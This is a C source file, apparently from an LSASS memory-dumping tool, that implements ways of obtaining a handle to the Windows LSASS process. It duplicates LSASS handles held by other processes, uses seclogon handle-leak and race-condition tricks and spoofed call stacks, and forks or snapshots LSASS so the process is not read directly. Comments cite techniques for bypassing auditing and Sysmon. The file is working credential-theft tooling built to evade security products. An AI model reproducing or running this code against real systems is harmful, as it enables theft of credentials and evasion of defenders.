#include "utils.h"
#include "handle.h"
#include "dinvoke.h"
#include "modules.h"
#include "malseclogon.h"
#include "spoof_callstack.h"

#if defined(NANO) && !defined(SSP)

BOOL find_token_handles_in_process(
    IN DWORD process_pid,
    IN DWORD permissions,
    OUT PHANDLE_LIST* phandle_list)
{
    BOOL ret_val = FALSE;
    BOOL success = FALSE;
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
    ULONG handleTableInformationSize = 0;

    DPRINT("Finding token handles in the process with PID %ld", process_pid);

    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
    if (!handle_list)
    {
        malloc_failed();
        goto cleanup;
    }

    ULONG TokenTypeIndex = 0;
    success = get_type_index_by_name(TOKEN_HANDLE_TYPE, &TokenTypeIndex);
    if (!success)
        goto cleanup;

    success = get_all_handles(
        &handleTableInformation,
        &handleTableInformationSize);
    if (!success)
        goto cleanup;

    // loop over each handle
    for (ULONG j = 0; j < handleTableInformation->Count; j++)
    {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];

        // make sure this handle is from the target process
        if (handleInfo->UniqueProcessId != process_pid)
            continue;

        // make sure the handle has the permissions we need
        if ((handleInfo->GrantedAccess & permissions) != permissions)
            continue;

        // make sure the handle is of type 'Token'
        if (handleInfo->ObjectTypeIndex != TokenTypeIndex)
            continue;

        if (handle_list->Count + 1 > MAX_HANDLES)
        {
            PRINT_ERR("Too many handles, please increase MAX_HANDLES");
            goto cleanup;
        }
        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
    }

    *phandle_list = handle_list;
    ret_val = TRUE;
    DPRINT("Found %ld handles", handle_list->Count);

cleanup:
    if (!ret_val && handle_list)
    {
        DATA_FREE(handle_list, sizeof(HANDLE_LIST));
    }
    if (handleTableInformation)
    {
        DATA_FREE(handleTableInformation, handleTableInformationSize);
    }

    return ret_val;
}

BOOL find_process_handles_in_process(
    IN DWORD process_pid,
    IN DWORD permissions,
    OUT PHANDLE_LIST* phandle_list)
{
    BOOL ret_val = FALSE;
    BOOL success = FALSE;
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
    ULONG handleTableInformationSize = 0;

    DPRINT("Finding process handles in the process with PID %ld", process_pid);

    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
    if (!handle_list)
    {
        malloc_failed();
        goto cleanup;
    }

    ULONG ProcesTypeIndex = 0;
    success = get_type_index_by_name(PROCESS_HANDLE_TYPE, &ProcesTypeIndex);
    if (!success)
        goto cleanup;

    success = get_all_handles(
        &handleTableInformation,
        &handleTableInformationSize);
    if (!success)
        goto cleanup;

    // loop over each handle
    for (ULONG j = 0; j < handleTableInformation->Count; j++)
    {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];

        // make sure this handle is from the target process
        if (handleInfo->UniqueProcessId != process_pid)
            continue;

        // make sure the handle has the permissions we need
        if ((handleInfo->GrantedAccess & permissions) != permissions)
            continue;

        // make sure the handle is of type 'Process'
        if (handleInfo->ObjectTypeIndex != ProcesTypeIndex)
            continue;

        if (handle_list->Count + 1 > MAX_HANDLES)
        {
            PRINT_ERR("Too many handles, please increase MAX_HANDLES");
            goto cleanup;
        }
        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
    }

    *phandle_list = handle_list;
    ret_val = TRUE;
    DPRINT("Found %ld handles", handle_list->Count);

cleanup:
    if (handleTableInformation)
    {
        DATA_FREE(handleTableInformation, handleTableInformationSize);
    }
    if (!ret_val && handle_list)
    {
        DATA_FREE(handle_list, sizeof(HANDLE_LIST));
    }

    return ret_val;
}

/*
 * Some security products remove permissions from handles
 * such as PROCESS_VM_READ. Make sure the handle has all
 * the permissions that we requested
 */
BOOL check_handle_privs(
    IN HANDLE handle,
    IN DWORD permissions)
{
    BOOL ret_val = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    PUBLIC_OBJECT_BASIC_INFORMATION obj_info = { 0 };

    status = NtQueryObject_(
        handle,
        ObjectBasicInformation,
        &obj_info,
        sizeof(PUBLIC_OBJECT_BASIC_INFORMATION),
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQueryObject", status);
        goto cleanup;
    }

    if ((obj_info.GrantedAccess & permissions) == permissions)
    {
        ret_val = TRUE;
        DPRINT(
            "The handle has the appropiate permissions: 0x%lx",
            obj_info.GrantedAccess);
    }
    else
    {
        ret_val = FALSE;
        DPRINT_ERR(
            "The handle should have access permissions of 0x%lx but has 0x%lx",
            permissions,
            permissions & obj_info.GrantedAccess);
        PRINT_ERR("Could not open a handle with the requested permissions");
    }

cleanup:
    return ret_val;
}


/*
 * "The DuplicateHandle system call has an interesting behaviour
 * when using the pseudo current process handle, which has the value -1.
 * Specifically if you try and duplicate the pseudo handle from another
 * process you get back a full access handle to the source process."
 * https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html
 */
HANDLE make_handle_full_access(
    IN HANDLE hProcess,
    IN DWORD attributes)
{
    if (!hProcess)
        return NULL;

    HANDLE hDuped = NULL;
    NTSTATUS status = NtDuplicateObject(
        hProcess,
        (HANDLE)-1,
        NtCurrentProcess(),
        &hDuped,
        0,
        attributes,
        DUPLICATE_SAME_ACCESS);

    NtClose(hProcess); hProcess = NULL;

    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtDuplicateObject", status);
        return NULL;
    }

    return hDuped;
}

// https://codewhitesec.blogspot.com/2022/09/attacks-on-sysmon-revisited-sysmonente.html
HANDLE elevate_handle_via_duplicate(
    IN HANDLE hProcess,
    IN ACCESS_MASK DesiredAccess,
    IN DWORD HandleAttributes)
{
    HANDLE hDupPriv = NULL;
    HANDLE hHighPriv = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    ULONG options = 0;

    if (!hProcess)
        goto cleanup;

    if (!DesiredAccess)
        options = DUPLICATE_SAME_ACCESS;

    status = NtDuplicateObject(
        NtCurrentProcess(),
        hProcess,
        NtCurrentProcess(),
        &hDupPriv,
        PROCESS_DUP_HANDLE,
        FALSE,
        0);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtDuplicateObject", status);
        goto cleanup;
    }

    status = NtDuplicateObject(
        hDupPriv,
        NtCurrentProcess(),
        NtCurrentProcess(),
        &hHighPriv,
        DesiredAccess,
        HandleAttributes,
        options);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtDuplicateObject", status);
        goto cleanup;
    }

    DPRINT(
        "Duplicated handle: 0x%lx -> 0x%lx",
        (DWORD)(ULONG_PTR)hProcess,
        (DWORD)(ULONG_PTR)hHighPriv);

cleanup:
    if (hProcess)
        NtClose(hProcess);
    if (hDupPriv)
        NtClose(hDupPriv);

    return hHighPriv;
}

// get a handle to LSASS via multiple methods
BOOL obtain_lsass_handle(
    OUT PHANDLE phProcess,
    IN DWORD lsass_pid,
    IN BOOL duplicate_handle,
    IN BOOL elevate_handle,
    IN BOOL duplicate_elevate,
    IN BOOL use_seclogon_duplicate,
    IN DWORD spoof_callstack,
    IN BOOL is_seclogon_leak_local_stage_2,
    IN LPCSTR seclogon_leak_remote_binary,
    OUT PPROCESS_LIST* Pcreated_processes,
    IN BOOL use_valid_sig,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    OUT PHANDLE PhSnapshot,
    IN BOOL use_seclogon_leak_local,
    IN BOOL use_seclogon_leak_remote,
    IN BOOL use_lsass_shtinkering)
{
    BOOL   ret_val               = FALSE;
    BOOL   success               = FALSE;
    HANDLE hProcess              = NULL;
    DWORD  permissions           = LSASS_DEFAULT_PERMISSIONS;
    DWORD  duplicate_permissions = 0;
    DWORD  attributes            = 0;
    BOOL   use_seclogon_leak     = use_seclogon_leak_local || use_seclogon_leak_remote;

    if (!phProcess)
        return FALSE;

    // --duplicate-elevate is simply --duplicate and --elevate-handle used together
    if (duplicate_elevate)
    {
        elevate_handle = TRUE;
        duplicate_handle = TRUE;
    }

    if (use_seclogon_leak && !is_seclogon_leak_local_stage_2)
    {
        success = malseclogon_handle_leak(
            seclogon_leak_remote_binary,
            dump_path,
            fork_lsass,
            snapshot_lsass,
            use_valid_sig,
            use_lsass_shtinkering,
            use_seclogon_leak_local,
            lsass_pid,
            Pcreated_processes);
        if (!success)
            goto cleanup;
        if (use_seclogon_leak_local)
            return TRUE;
    }

    // --seclogon-leak-remote requires --duplicate internaly
    if (use_seclogon_leak_remote)
        duplicate_handle = TRUE;

    // LSASS Shtinkering needs the handle to be inheritable
    if (use_lsass_shtinkering)
        attributes |= OBJ_INHERIT;

    // fork and snapshot require LSASS_CLONE_PERMISSIONS
    if ((fork_lsass || snapshot_lsass) && !use_seclogon_leak)
    {
        permissions = LSASS_CLONE_PERMISSIONS;
    }
    // shtinkering requires LSASS_SHTINKERING_PERMISSIONS
    else if (use_lsass_shtinkering)
    {
        permissions = LSASS_SHTINKERING_PERMISSIONS;
    }

    // remember the permissions we needed
    duplicate_permissions = permissions;

    // if --elevate-handle was provided, we use PROCESS_QUERY_LIMITED_INFORMATION
    if (elevate_handle)
    {
        permissions = PROCESS_QUERY_LIMITED_INFORMATION;
    }

    hProcess = open_handle_to_lsass(
        lsass_pid,
        permissions,
        duplicate_handle,
        use_seclogon_duplicate,
        spoof_callstack,
        is_seclogon_leak_local_stage_2,
        attributes);
    if (!hProcess)
        goto cleanup;

    success = check_handle_privs(hProcess, permissions);
    if (!success)
        goto cleanup;

    if (elevate_handle)
    {
        hProcess = elevate_handle_via_duplicate(
            hProcess,
            duplicate_permissions,
            attributes);
        if (!hProcess)
            goto cleanup;

        success = check_handle_privs(hProcess, duplicate_permissions);
        if (!success)
            goto cleanup;
    }
    else if ((fork_lsass || snapshot_lsass || use_lsass_shtinkering)
            && use_seclogon_leak)
    {
        hProcess = make_handle_full_access(
            hProcess,
            attributes);
        if (!hProcess)
            goto cleanup;

        success = check_handle_privs(hProcess, duplicate_permissions);
        if (!success)
            goto cleanup;
    }

    // avoid reading LSASS directly by making a fork
    if (fork_lsass)
    {
        hProcess = fork_process(
            hProcess,
            attributes);
        if (!hProcess)
            goto cleanup;
    }

    // avoid reading LSASS directly by making a snapshot
    if (snapshot_lsass)
    {
        hProcess = snapshot_process(
            hProcess,
            PhSnapshot);
        if (!hProcess)
            goto cleanup;
    }

    ret_val = TRUE;

    *phProcess = hProcess;

cleanup:
    if (!ret_val && hProcess)
        NtClose(hProcess);

    return ret_val;
}


HANDLE open_handle_to_lsass(
    IN DWORD lsass_pid,
    IN DWORD permissions,
    IN BOOL dup,
    IN BOOL seclogon_race,
    IN DWORD spoof_callstack,
    IN BOOL is_malseclogon_stage_2,
    IN DWORD attributes)
{
    HANDLE hProcess = NULL;
    // use MalSecLogon to leak a handle to LSASS
    if (is_malseclogon_stage_2)
    {
        // this is always done from an EXE
#ifdef EXE
        hProcess = malseclogon_stage_2();
#endif
    }
    // duplicate an existing handle to LSASS
    else if (dup)
    {
        DPRINT("Trying to find an existing " LSASS " handle to duplicate");
        hProcess = duplicate_lsass_handle(
            lsass_pid,
            permissions,
            attributes);
    }
    else if (seclogon_race)
    {
        hProcess = malseclogon_race_condition(
            lsass_pid,
            permissions,
            attributes);
    }
    else if (spoof_callstack)
    {
        hProcess = open_handle_with_spoofed_callstack(
            spoof_callstack,
            lsass_pid,
            permissions,
            attributes);
    }
    // good old NtOpenProcess
    else if (lsass_pid)
    {
        DPRINT("Using NtOpenProcess to get a handle to " LSASS);
        hProcess = get_process_handle(
            lsass_pid,
            permissions,
            FALSE,
            attributes);
    }
    // use NtGetNextProcess until a handle to LSASS is obtained
    else
    {
        // the variable lsass_pid should always be set
        // this branch won't be called
        DPRINT("Using NtGetNextProcess to get a handle to " LSASS);
        hProcess = find_lsass(
            permissions,
            attributes);
    }
    if (hProcess)
    {
        DPRINT(LSASS " handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
    }
    return hProcess;
}

// use NtGetNextProcess to get a handle to LSASS
HANDLE find_lsass(
    IN DWORD dwFlags,
    IN DWORD attributes)
{
    HANDLE hProcess = NULL;
    NTSTATUS status;

    while (TRUE)
    {
        status = NtGetNextProcess(
            hProcess,
            dwFlags,
            attributes,
            0,
            &hProcess);
        if (status == STATUS_NO_MORE_ENTRIES)
        {
            PRINT_ERR("The " LSASS " process was not found. Try providing the PID with -p or --pid");
            return NULL;
        }
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtGetNextProcess", status);
            DPRINT_ERR("Could not find the " LSASS " process");
            return NULL;
        }
        if (is_lsass(hProcess))
            return hProcess;
    }
}

// use NtOpenProcess to get a handle to a process
HANDLE get_process_handle(
    IN DWORD dwPid,
    IN DWORD dwFlags,
    IN BOOL quiet,
    IN DWORD attributes)
{
    NTSTATUS status;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(
        &ObjectAttributes,
        NULL,
        attributes,
        NULL,
        NULL);
    CLIENT_ID uPid = { 0 };

    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
    uPid.UniqueThread = (HANDLE)0;

    status = NtOpenProcess(
        &hProcess,
        dwFlags,
        &ObjectAttributes,
        &uPid);

    if (status == STATUS_INVALID_CID)
    {
        if (!quiet)
        {
            PRINT_ERR(
                "There is no process with the PID %ld.",
                dwPid);
        }
        return NULL;
    }
    if (status == STATUS_ACCESS_DENIED)
    {
        if (!quiet)
        {
            PRINT_ERR(
                "Could not open a handle to %ld.",
                dwPid);
        }
        return NULL;
    }
    else if (!NT_SUCCESS(status))
    {
        syscall_failed("NtOpenProcess", status);
        DPRINT_ERR("Could not open handle to process %ld", dwPid);
        return NULL;
    }

    return hProcess;
}

// get all handles in the system
BOOL get_all_handles(
    OUT PSYSTEM_HANDLE_INFORMATION* phandle_table,
    OUT PULONG phandle_table_size)
{
    BOOL ret_val = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    ULONG buffer_size = sizeof(SYSTEM_HANDLE_INFORMATION);
    ULONG prev_buffer_size = buffer_size;
    PVOID handleTableInformation = NULL;

    handleTableInformation = intAlloc(buffer_size);
    if (!handleTableInformation)
    {
        malloc_failed();
        goto cleanup;
    }

    while (TRUE)
    {
        //get information of all the existing handles
        status = NtQuerySystemInformation(
            SystemHandleInformation,
            handleTableInformation,
            buffer_size,
            &buffer_size);
        if (status == STATUS_INFO_LENGTH_MISMATCH)
        {
            // the buffer was too small, buffer_size now has the new length
            DATA_FREE(handleTableInformation, prev_buffer_size);
            prev_buffer_size = buffer_size;
            handleTableInformation = intAlloc(buffer_size);
            if (!handleTableInformation)
            {
                malloc_failed();
                goto cleanup;
            }
            continue;
        }
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtQuerySystemInformation", status);
            goto cleanup;
        }
        break;
    }

    *phandle_table = (PSYSTEM_HANDLE_INFORMATION)handleTableInformation;
    *phandle_table_size = buffer_size;
    ret_val = TRUE;
    DPRINT("Obtained the handle table");

cleanup:
    if (!ret_val && handleTableInformation)
    {
        DATA_FREE(handleTableInformation, buffer_size);
    }

    return ret_val;
}

// check if a PID is included in the process list
BOOL process_is_included(
    IN PPROCESS_LIST process_list,
    IN ULONG ProcessId)
{
    for (ULONG i = 0; i < process_list->Count; i++)
    {
        if (process_list->ProcessId[i] == ProcessId)
            return TRUE;
    }
    return FALSE;
}

// obtain a list of PIDs from a handle table
BOOL get_processes_from_handle_table(
    IN PSYSTEM_HANDLE_INFORMATION handleTableInformation,
    OUT PPROCESS_LIST* pprocess_list)
{
    BOOL ret_val = FALSE;
    PPROCESS_LIST process_list = NULL;

    process_list = intAlloc(sizeof(PROCESS_LIST));
    if (!process_list)
    {
        malloc_failed();
        goto cleanup;
    }

    PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo;
    for (ULONG i = 0; i < handleTableInformation->Count; i++)
    {
        handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[i];

        if (!process_is_included(process_list, handleInfo->UniqueProcessId))
        {
            if (process_list->Count + 1 > MAX_PROCESSES)
            {
                PRINT_ERR("Too many processes, please increase MAX_PROCESSES");
                goto cleanup;
            }
            process_list->ProcessId[process_list->Count++] = handleInfo->UniqueProcessId;
        }
    }

    *pprocess_list = process_list;
    ret_val = TRUE;

    DPRINT(
        "Enumerated %ld handles from %ld processes",
        handleTableInformation->Count,
        process_list->Count);

cleanup:
    if (!ret_val && process_list)
    {
        DATA_FREE(process_list, sizeof(PROCESS_LIST));
    }

    return ret_val;
}

// call NtQueryObject with ObjectTypesInformation
BOOL query_object_types_info(
    POBJECT_TYPES_INFORMATION* pObjectTypes,
    PULONG pObjectTypesSize)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    ULONG BufferLength = 0x1000;
    ULONG PrevBufferLength = BufferLength;
    POBJECT_TYPES_INFORMATION obj_type_information = NULL;

    do
    {
        PrevBufferLength = BufferLength;
        obj_type_information = intAlloc(BufferLength);
        if (!obj_type_information)
        {
            malloc_failed();
            return FALSE;
        }

        status = NtQueryObject_(
            NULL,
            ObjectTypesInformation,
            obj_type_information,
            BufferLength,
            &BufferLength);

        if (NT_SUCCESS(status))
        {
            *pObjectTypes = obj_type_information;
            *pObjectTypesSize = BufferLength;
            return TRUE;
        }

        DATA_FREE(obj_type_information, PrevBufferLength);
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    syscall_failed("NtQueryObject", status);
    return FALSE;
}

// get index of object type 'Process'
BOOL get_type_index_by_name(
    IN LPWSTR handle_type,
    OUT PULONG ProcesTypeIndex)
{
    BOOL ret_val = FALSE;
    BOOL success = FALSE;
    POBJECT_TYPES_INFORMATION ObjectTypes = NULL;
    POBJECT_TYPE_INFORMATION_V2 CurrentType = NULL;
    ULONG ObjectTypesSize = 0;

    success = query_object_types_info(
        &ObjectTypes,
        &ObjectTypesSize);
    if (!success)
        goto cleanup;

    CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
    for (ULONG i = 0; i < ObjectTypes->NumberOfTypes; i++)
    {
        if (!_wcsicmp(CurrentType->TypeName.Buffer, handle_type))
        {
            *ProcesTypeIndex = i + 2;
            ret_val = TRUE;
            DPRINT("Found the index of type '%ls': %ld", handle_type, i + 2);
            goto cleanup;
        }
        CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentType);
    }

    DPRINT_ERR("Index of type '%ls' not found", handle_type);

cleanup:
    if (ObjectTypes)
    {
        DATA_FREE(ObjectTypes, ObjectTypesSize);
    }

    return ret_val;
}

// find and duplicate a handle to LSASS
HANDLE duplicate_lsass_handle(
    IN DWORD lsass_pid,
    IN DWORD permissions,
    IN DWORD attributes)
{
    BOOL ret_val = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    BOOL success = FALSE;
    HANDLE duplicated_handle = NULL;
    HANDLE hProcess = NULL;
    HANDLE hDuped = NULL;
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
    ULONG handleTableInformationSize = 0;
    PPROCESS_LIST process_list = NULL;
    ULONG ProcessId = 0;
    DWORD local_pid = 0;
    ULONG ProcesTypeIndex = 0;

    success = get_type_index_by_name(PROCESS_HANDLE_TYPE, &ProcesTypeIndex);
    if (!success)
        goto cleanup;

    success = get_all_handles(
        &handleTableInformation,
        &handleTableInformationSize);
    if (!success)
        goto cleanup;

    success = get_processes_from_handle_table(
        handleTableInformation,
        &process_list);
    if (!success)
        goto cleanup;

    local_pid = (DWORD)READ_MEMLOC(CID_OFFSET);

    // loop over each ProcessId
    for (ULONG i = 0; !ret_val && i < process_list->Count; i++)
    {
        ProcessId = process_list->ProcessId[i];

        if (ProcessId == local_pid)
            continue;
        if (ProcessId == lsass_pid)
            continue;
        if (ProcessId == 0)
            continue;
        if (ProcessId == 4)
            continue;

        // we will open a handle to this ProcessId later on
        hProcess = NULL;

        // loop over each handle of this ProcessId
        for (ULONG j = 0; j < handleTableInformation->Count; j++)
        {
            PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];

            // make sure this handle is from the current ProcessId
            if (handleInfo->UniqueProcessId != ProcessId)
                continue;

            // make sure the handle is of type 'Process'
            if (handleInfo->ObjectTypeIndex != ProcesTypeIndex)
                continue;

            // make sure the handle has the permissions we need
            if ((handleInfo->GrantedAccess & (permissions)) != (permissions))
                continue;

            if (!hProcess)
            {
                // open a handle to the process with PROCESS_DUP_HANDLE
                hProcess = get_process_handle(
                    ProcessId,
                    PROCESS_DUP_HANDLE,
                    TRUE,
                    0);
                if (!hProcess)
                    break;
            }

            // duplicate the handle
            hDuped = NULL;
            status = NtDuplicateObject(
                hProcess,
                (HANDLE)(DWORD_PTR)handleInfo->HandleValue,
                NtCurrentProcess(),
                &hDuped,
                0,
                attributes,
                DUPLICATE_SAME_ACCESS);
            if (!NT_SUCCESS(status))
                continue;

            if (is_lsass(hDuped))
            {
                // found LSASS handle
                DPRINT(
                    "Found " LSASS " handle: 0x%x, on process: %d",
                    handleInfo->HandleValue,
                    handleInfo->UniqueProcessId);
                ret_val = TRUE;
                duplicated_handle = hDuped;
                break;
            }
            NtClose(hDuped); hDuped = NULL;
        }
        if (hProcess)
        {
            NtClose(hProcess); hProcess = NULL;
        }
    }

    if (!ret_val)
    {
        PRINT_ERR("No handle to the " LSASS " process was found");
    }

cleanup:
    if (handleTableInformation)
    {
        DATA_FREE(handleTableInformation, handleTableInformationSize);
    }
    if (process_list)
    {
        DATA_FREE(process_list, sizeof(PROCESS_LIST));
    }
    if (hProcess)
        NtClose(hProcess);

    if (ret_val)
        return duplicated_handle;
    else
        return NULL;
}

// create a clone (fork) of the LSASS process
HANDLE fork_process(
    IN HANDLE hProcess,
    IN DWORD attributes)
{
    if (!hProcess)
        return NULL;

    // fork the LSASS process
    HANDLE hCloneProcess = NULL;
    OBJECT_ATTRIBUTES attrs = { 0 };
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    InitializeObjectAttributes(&attrs, NULL, attributes, 0, NULL);

    status = NtCreateProcessEx(
        &hCloneProcess,
        GENERIC_ALL,
        &attrs,
        hProcess,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        NULL,
        0);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateProcessEx", status);
        hCloneProcess = NULL;
    }
    else
    {
        DPRINT(
            "Forked the " LSASS " process, new handle: 0x%lx",
            (DWORD)(ULONG_PTR)hCloneProcess);
    }

    NtClose(hProcess); hProcess = NULL;
    return hCloneProcess;
}

// create a snapshot of the LSASS process
HANDLE snapshot_process(
    IN HANDLE hProcess,
    OUT PHANDLE hSnapshot)
{
    BOOL ret_val = FALSE;
    PssNtCaptureSnapshot_t PssNtCaptureSnapshot;
    PssNtQuerySnapshot_t PssNtQuerySnapshot;
    HANDLE hCloneProcess = NULL;
    DWORD process_flags = 0;
    DWORD thread_flags = 0;
    DWORD error_code = 0;

    if (!hProcess || !hSnapshot)
        goto cleanup;

    // find the address of PssNtCaptureSnapshot dynamically
    PssNtCaptureSnapshot = (PssNtCaptureSnapshot_t)(ULONG_PTR)get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        PssNtCaptureSnapshot_SW2_HASH,
        0);
    if (!PssNtCaptureSnapshot)
    {
        api_not_found("PssNtCaptureSnapshot");
        goto cleanup;
    }

    *hSnapshot    = NULL;
    process_flags = PROCESS_PPSCAPTURESNAPSHOT_PERMISSIONS;
    thread_flags  = THREAD_PPSCAPTURESNAPSHOT_PERMISSIONS;

    error_code = PssNtCaptureSnapshot(
        hSnapshot,
        hProcess,
        process_flags,
        thread_flags);

    NtClose(hProcess); hProcess = NULL;

    if (error_code != ERROR_SUCCESS)
    {
        DPRINT_ERR("Could not create a snapshot of " LSASS ", error: 0x%lx", error_code);
        goto cleanup;
    }

    DPRINT(
        "Created a snapshot of the " LSASS " process, snapshot handle: 0x%lx",
        (DWORD)(ULONG_PTR)*hSnapshot);

    // find the address of PssNtQuerySnapshot dynamically
    PssNtQuerySnapshot = (PssNtQuerySnapshot_t)(ULONG_PTR)get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        PssNtQuerySnapshot_SW2_HASH,
        0);
    if (!PssNtQuerySnapshot)
    {
        api_not_found("PssNtQuerySnapshot");
        goto cleanup;
    }

    error_code = PssNtQuerySnapshot(
        *hSnapshot,
        PSS_QUERY_VA_CLONE_INFORMATION,
        &hCloneProcess,
        sizeof(PVOID));
    if (error_code != ERROR_SUCCESS)
    {
        DPRINT_ERR("Could not query the snapshot of " LSASS ", error: 0x%lx", error_code);
        goto cleanup;
    }

    ret_val = TRUE;

    DPRINT(
        "Got a handle to the snapshot process: 0x%lx",
        (DWORD)(ULONG_PTR)hCloneProcess);

cleanup:
    if (hProcess)
        NtClose(hProcess);
    if (!ret_val && *hSnapshot)
        NtClose(*hSnapshot);
    if (!ret_val && hCloneProcess)
        NtClose(hCloneProcess);

    if (ret_val)
        return hCloneProcess;
    else
        return NULL;
}

// frees a snapshot of the LSASS process
BOOL free_snapshot(
    IN HANDLE hSnapshot)
{
    PssNtFreeSnapshot_t PssNtFreeSnapshot = NULL;
    DWORD error_code = 0;

    if (!hSnapshot)
        return TRUE;

    PssNtFreeSnapshot = (PssNtFreeSnapshot_t)(ULONG_PTR)get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        PssNtFreeSnapshot_SW2_HASH,
        0);
    if (!PssNtFreeSnapshot)
    {
        api_not_found("PssNtFreeSnapshot");
        return FALSE;
    }

    error_code = PssNtFreeSnapshot(hSnapshot);

    NtClose(hSnapshot); hSnapshot = NULL;

    if (error_code != ERROR_SUCCESS)
    {
        DPRINT_ERR("Could not free the snapshot of " LSASS ", error: 0x%lx", error_code);
        return FALSE;
    }
    DPRINT("The snapshot has been freed");

    return TRUE;
}

#endif
